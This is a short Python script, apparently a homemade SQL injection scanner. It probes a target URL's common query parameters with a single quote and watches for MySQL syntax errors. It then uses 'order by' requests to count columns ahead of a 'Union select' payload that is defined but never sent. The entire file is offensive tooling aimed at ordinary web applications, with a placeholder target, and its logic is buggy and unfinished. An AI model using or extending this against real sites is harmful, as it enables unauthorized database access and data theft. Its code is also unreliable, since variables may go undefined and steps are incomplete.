import requests


ip_addr = "http://IPAddress/cat.php" #<-- change this to test target
lyst=["?id=","?cat=","?dir=","?action=","?board=","?date=","?detail=","?file=","?download=","?path=","?folder=","?prefix=","?include=","?page=","?inc=","?locate=","?show=","?doc=","?site="]
count = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20"]
ua = ""
ob = "1 order by "
uas = "1%20Union%20select%20"
i = "You have an error in your SQL syntax"


r = requests.get(ip_addr)
with open('sql.txt','w') as sql:
        r = requests.get(ip_addr)
        r = r.content
        sql.write(str(r))
        sql.close()
with open('sql.txt','r') as sql:
        for x in sql:
                for element in lyst:
                        if element in x:
                                url = ip_addr+element
                                r = requests.get(url+"'")
                                r = r.text
                                if i in r:
                                        print('possible sql injection, checking for amount of columns')

# gets the correct usable columns using order by 
for x in (count):
	page = (url+ob+x)
	r = requests.get(page)
	r = r.text
	if "Unknown column" in r:
		x = (int(x))
		x = (x-1)
		print(x,"nuber of colmns usable")
		break

with open('ver','w' )as v:
	for n in range(x):
		n = (str(n))
		v.write(n)
v.close()
lst = []
with open('ver','r' )as v:
	for x in v:
		lst.extend(x)
		print(lst)
